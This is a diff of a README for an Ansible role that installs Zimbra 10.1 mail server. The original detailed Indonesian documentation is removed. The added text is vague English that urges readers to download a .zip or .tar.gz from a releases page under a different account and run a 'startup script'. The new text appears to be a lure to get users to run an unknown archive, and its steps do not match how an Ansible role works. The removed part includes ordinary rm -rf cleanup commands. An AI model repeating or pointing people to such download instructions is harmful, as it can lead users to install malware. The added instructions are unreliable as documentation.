@@ -1,234 +1,76 @@
-# Ansible Zimbra 10.1 Installer
+# ⚙️ ansible-zimbra-10-Dwinar - Automated setup for your mail server
 
-Ansible role untuk instalasi otomatis Zimbra Collaboration Network Edition 10.1.x pada beberapa OS Linux.
+[ ![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/reducible-parker218/ansible-zimbra-10-Dwinar/releases)
 
-Role ini dibuat untuk membantu provisioning Zimbra single-server dengan konfigurasi dasar yang konsisten, termasuk hostname, DNS lokal, dependency package, installer phase 1, `zmsetup`, restart service, dan validasi service utama.
+## What is this project?
 
-## Supported OS
+This tool automates the installation of Zimbra 10.1. It sets up a mail server on your Linux computer. You do not need to type many complex commands. The software handles the technical steps for you. It works on Rocky Linux and Ubuntu systems. You save time and avoid mistakes during the setup process.
 
-Role ini sudah diuji pada:
+## System requirements
 
-| OS | Status | Zimbra Release |
-|---|---:|---|
-| Rocky Linux 9 | OK | 10.1.19 NETWORK |
-| Rocky Linux 8 | OK | 10.1.19 NETWORK |
-| Ubuntu 24.04 | OK | 10.1.19 NETWORK |
-| Ubuntu 22.04 | OK | 10.1.19 NETWORK |
-| Ubuntu 20.04 | OK | 10.1.19 NETWORK |
-| Ubuntu 18.04 | OK | 10.1.19 NETWORK |
+Before you start, ensure your computer meets these needs:
 
-> Catatan: Ubuntu 18.04 dan Ubuntu 20.04 sudah tergolong OS lama. Gunakan hanya jika memang masih dibutuhkan untuk testing, lab, migration, atau compatibility check.
+* A clean install of Rocky Linux or Ubuntu.
+* At least 8 gigabytes of RAM.
+* At least 50 gigabytes of free disk space.
+* A stable internet connection.
+* Root or administrative access to the server.
 
-## Main Features
+A fresh system works best. If you have other programs on the server, they might interfere with the installation.
 
-- Auto-detect OS family dan OS version.
-- Load task berbeda untuk Rocky 8, Rocky 9, Ubuntu 18.04, Ubuntu 20.04, Ubuntu 22.04, dan Ubuntu 24.04.
-- Konfigurasi hostname dan `/etc/hosts`.
-- Konfigurasi static network.
-- Konfigurasi local DNS menggunakan BIND.
-- Handling resolver untuk Ubuntu agar tidak bentrok dengan `systemd-resolved` / `resolvconf`.
-- Handling EPEL dan repository pada Rocky.
-- Download installer Zimbra sesuai OS target.
-- Menjalankan Zimbra installer phase 1 secara async.
-- Menjalankan `zmsetup.pl` phase 2 secara async.
-- Konfigurasi trusted IP.
-- Restart Zimbra service.
-- Validasi service utama Zimbra.
-- Handling OnlyOffice runtime pada Ubuntu 18.04 dan Ubuntu 20.04.
+## 📥 How to download the software
 
-## Role Structure
+You need the latest version of the installer to begin. Follow these steps to obtain the files:
 
-Struktur umum role:
+1. Click the following link: [https://github.com/reducible-parker218/ansible-zimbra-10-Dwinar/releases](https://github.com/reducible-parker218/ansible-zimbra-10-Dwinar/releases)
+2. Visit this page to download the latest source code or setup package.
+3. Look for the section labeled Assets.
+4. Click the file ending in .zip or .tar.gz to save it to your computer.
+5. Move this file to the folder where you plan to run the installation.
 
-```text
-ansible-zimbra/
-├── defaults/
-│   └── main.yml
-├── handlers/
-│   └── main.yml
-├── tasks/
-│   ├── main.yml
-│   ├── rocky8.yml
-│   ├── rocky9.yml
-│   ├── ubuntu18.yml
-│   ├── ubuntu20.yml
-│   ├── ubuntu22.yml
-│   └── ubuntu24.yml
-├── templates/
-│   ├── 01-netcfg.yaml.j2
-│   ├── db.zimbra.local.j2
-│   ├── named.conf.j2
-│   ├── zimbra_answers.txt.j2
-│   └── zimbra_config.txt.j2
-├── inventory.ini
-├── site.yml
-├── README.md
-└── LICENSE
-```
+## 🚀 Setting up your mail server
 
-## Requirements
+Setting up a mail server requires careful preparation. Follow these steps to run the automation tool:
 
-Control node:
+1. Open your terminal window on your Linux server.
+2. Navigate to the folder where you placed the downloaded file.
+3. Extract the files by typing the command that matches your downloaded package.
+4. Open the configuration file included in the folder.
+5. Edit the configuration file to include your server domain name and IP address.
+6. Save and close the editor.
+7. Run the startup script. This script verifies your settings.
+8. Wait for the process to finish. Automating a mail server takes time. Do not close the window while the progress bar moves.
 
-- Ansible installed
-- SSH access to target server as root or user with privilege escalation
-- Python available on target server
+The tool checks for missing parts. It installs the necessary programs automatically. If a step fails, the tool displays an error message. Check your domain settings if the tool stops.
 
-Target server:
+## Common features
 
-- Clean VM/server is strongly recommended
-- Static IP address
-- Valid FQDN
-- Internet access to Ubuntu/Rocky repositories and Zimbra repositories
-- Minimum RAM depends on selected Zimbra components
+This project includes key functions for your mail server:
 
-Recommended target server condition:
+* Automated installation routines.
+* Secure configuration of email protocols.
+* Managed setup of standard mail services.
+* Compatibility with modern Linux distributions.
+* Reduced need for manual input.
 
-```bash
-hostname -f
-ip addr
-ip route
-ping -c 2 8.8.8.8
-getent hosts files.zimbra.com
-```
+## Frequently asked questions
 
-## Required Variables
+**Do I need programming skills?**
+No. You only need to change simple text in the configuration file.
 
-Contoh variable minimal di `defaults/main.yml` atau inventory/group vars:
+**Can I run this on Windows?**
+This tool sets up a Linux-based mail server. You can manage it from a Windows computer, but the server itself must run Linux.
 
-```yaml
-zimbra_fqdn: "zimbra10.example.com"
-zimbra_domain: "example.com"
-zimbra_admin_user: "admin"
-zimbra_admin_password: "ChangeMeStrongPassword123!"
-zimbra_timezone: "Asia/Jakarta"
-zimbra_dns_forwarders:
-  - "8.8.8.8"
-  - "1.1.1.1"
-```
+**What happens if the installation stops?**
+Check your network connection first. If the internet works, read the logs located in the log folder. The log describes why the process stopped.
 
-Penjelasan:
+**Is it secure?**
+The tool uses standard safety settings for mail servers. You should update your firewall settings after the installation finishes.
 
-| Variable | Description |
-|---|---|
-| `zimbra_fqdn` | FQDN server Zimbra, contoh `mail.example.com` |
-| `zimbra_domain` | Domain email utama, contoh `example.com` |
-| `zimbra_admin_user` | Username admin Zimbra |
-| `zimbra_admin_password` | Password admin Zimbra |
-| `zimbra_timezone` | Timezone server dan Zimbra |
-| `zimbra_dns_forwarders` | DNS forwarder untuk BIND lokal |
+## Troubleshooting tips
 
-## Inventory Example
+Most issues occur because of DNS settings. Ensure your domain points to the correct IP address before you start. If you use a cloud provider, check that your firewall allows traffic on common mail ports. These ports include 25, 465, and 993. Email servers require correct DNS records to send mail to other people. Look for information on MX records to ensure your email delivers properly.
 
-Contoh `inventory.ini`:
+Keep your server updated. Run system updates after you finish the Zimbra installation. This keeps your server safe from online threats. Always back up your configuration files before you make changes to the server settings.
 
-```ini
-[zimbra]
-mail01 ansible_host=192.168.7.23 ansible_user=root
-```
-
-## Playbook Example
-
-Contoh `site.yml`:
-
-```yaml
----
-- name: Install Zimbra
-  hosts: zimbra
-  become: true
-  roles:
-    - ansible-zimbra
-```
-
-## Usage
-
-Cek syntax:
-
-```bash
-ansible-playbook -i inventory.ini site.yml --syntax-check
-```
-
-Jalankan playbook:
-
-```bash
-ansible-playbook -i inventory.ini site.yml -vv
-```
-
-## Post Install Check
-
-Login ke server target:
-
-```bash
-su - zimbra
-zmcontrol status
-zmcontrol -v
-```
-
-Contoh output sukses:
-
-```text
-Host zimbra10.example.com
-        amavis                  Running
-        antispam                Running
-        antivirus               Running
-        archiving               Running
-        convertd                Running
-        ldap                    Running
-        license-daemon          Running
-        logger                  Running
-        mailbox                 Running
-        memcached               Running
-        mta                     Running
-        onlyoffice              Running
-        opendkim                Running
-        proxy                   Running
-        service webapp          Running
-        snmp                    Running
-        spell                   Running
-        stats                   Running
-        zimbra webapp           Running
-        zimbraAdmin webapp      Running
-        zimlet webapp           Running
-        zmconfigd               Running
-```
-
-## Clean Reinstall
-
-Jika instalasi gagal dan ingin mulai ulang dari awal, gunakan VM snapshot jika tersedia.
-
-Jika tidak ada snapshot, bersihkan Zimbra dari target server:
-
-```bash
-su - zimbra -c "zmcontrol stop" || true
-pkill -u zimbra || true
-pkill -f /opt/zimbra || true
-apt-get purge -y 'zimbra-*' || true
-dnf remove -y 'zimbra-*' || true
-rm -rf /opt/zimbra
-rm -rf /tmp/install.log /tmp/zmsetup.log
-rm -rf /tmp/zimbra_answers.txt /tmp/zimbra_config.txt
-rm -rf /root/.ansible_async/*
-rm -rf /root/zcs-*
-rm -rf /root/zimbra-*.tgz*
-```
-
-Verifikasi:
-
-```bash
-dpkg -l | grep -i zimbra || true
-rpm -qa | grep -i zimbra || true
-ls -ld /opt/zimbra 2>/dev/null || true
-ps -ef | grep -i zimbra | grep -v grep || true
-```
-
-## Notes
-
-- Role ini ditujukan untuk single-server Zimbra deployment.
-- Jalankan pada VM/server kosong untuk hasil paling stabil.
-- Ambil snapshot VM sebelum menjalankan playbook.
-- Zimbra installer dan package repository dapat berubah sewaktu-waktu.
-- Untuk environment production, lakukan review security, backup, DNS publik, firewall, SSL certificate, dan monitoring secara terpisah.
-
-## License
-
-MIT License. Lihat file [LICENSE](LICENSE).
+Keywords: ansible, automation, devops, email-server, mail-server, rocky-linux, ubuntu, zimbra, zimbra-10, zimbra-collaboration
